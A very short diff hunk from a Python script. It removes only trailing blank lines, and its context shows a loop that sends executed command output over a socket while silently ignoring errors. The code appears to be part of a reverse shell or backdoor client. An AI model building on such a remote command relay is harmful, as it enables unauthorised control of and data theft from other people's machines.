@@ -56,10 +56,3 @@ if __name__ == '__main__':
                 sock.sendall(result.stdout.read())
             except:
                 pass
-       
- 
-
-     
-
-
-
